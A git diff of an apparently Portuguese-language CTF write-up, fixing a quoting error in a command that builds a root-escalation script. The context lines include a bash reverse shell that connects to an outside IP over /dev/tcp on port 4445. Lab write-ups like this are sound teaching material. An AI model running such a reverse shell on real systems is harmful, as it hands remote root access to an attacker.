@@ -108,7 +108,7 @@ Para isso preparamos nosso script para escalarmos para root com o comando abaixo
 ![Descrição da Imagem](https://github.com/r0s3mbr1ck/WriteUps/blob/main/Images/Pasted%20image%2020250211130324.png)
 
 ```Kali
-echo '#!/bin/bash > root_shell.sh
+echo '#!/bin/bash' > root_shell.sh
 ```
 ```Kali
 echo 'bash -i >& /dev/tcp/10.23.22.193/4445 0>&1' >> root_shell.sh
